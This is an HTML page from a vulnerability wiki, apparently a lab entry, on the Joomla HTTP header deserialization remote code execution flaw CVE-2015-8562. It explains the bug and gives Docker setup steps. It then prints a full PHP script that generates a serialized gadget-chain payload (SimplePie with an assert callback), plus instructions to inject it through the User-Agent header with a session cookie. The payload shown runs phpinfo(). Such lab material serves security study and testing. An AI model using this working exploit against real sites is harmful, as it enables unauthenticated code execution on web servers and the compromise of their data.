<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Joomla/CVE-2015-8562/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562)", url: "#_top", children: [
              {title: "Vulnerable Environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2020-25751%EF%BC%89Joomla%21%20paGO%20Commerce%202.5.9.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2020-25751%EF%BC%89Joomla%21%20paGO%20Commerce%202.5.9.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="joomla-http-header-unauthenticated-remote-code-execution-cve-2015-8562">Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562)<a class="headerlink" href="#joomla-http-header-unauthenticated-remote-code-execution-cve-2015-8562" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Joomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.</p>
<p>Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5. By storing user supplied headers in the databases session table it's possible to truncate the input by sending an 4-bytes UTF-8 character. The custom created payload is then executed once the session is read from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13.</p>
<p>References:</p>
<ul>
<li><a href="https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable Environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Executing following command to start a Joomla 3.4.5:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server is started, you can see the home page of it at <code>http://your-ip:8080</code>.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>First of all, you need to send a request without User-Agent header and remember the Cookie in the response:</p>
<p><img alt="" src="2.png" /></p>
<p>Then use this script to generate a payload (<a href="https://onlinephp.io/c/e824b">execute online</a>):</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">JSimplepieFactory</span> <span class="p">{</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">JDatabaseDriverMysql</span> <span class="p">{</span>

<span class="p">}</span>
<span class="k">class</span> <span class="nc">SimplePie</span> <span class="p">{</span>
    <span class="k">var</span> <span class="nv">$sanitize</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$cache</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$cache_name_function</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$javascript</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$feed_url</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">=</span> <span class="s2">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">javascript</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span> <span class="o">=</span> <span class="s2">&quot;assert&quot;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysql</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">JDatabaseDriverMysqli</span> <span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$disconnectHandlers</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSimplepieFactory</span><span class="p">();</span>
        <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">[</span><span class="nv">$x</span><span class="p">,</span> <span class="s2">&quot;init&quot;</span><span class="p">],</span>
        <span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysqli</span><span class="p">();</span>
<span class="nv">$poc</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span> 

<span class="nv">$poc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">*</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s1">&#39;\\0\\0\\0&#39;</span><span class="p">,</span> <span class="nv">$poc</span><span class="p">);</span>

<span class="k">echo</span> <span class="s2">&quot;123}__test|</span><span class="si">{</span><span class="nv">$poc</span><span class="si">}</span><span class="se">\xF0\x9D\x8C\x86</span><span class="s2">&quot;</span><span class="p">;</span>
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>Put this craft payload into User-Agent header with Cookie obtained earlier then send request again. As you can see, our code <code>phpinfo()</code> is executed:</p>
<p><img alt="" src="3.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2020-25751%EF%BC%89Joomla%21%20paGO%20Commerce%202.5.9.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2020-25751%EF%BC%89Joomla%21%20paGO%20Commerce%202.5.9.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>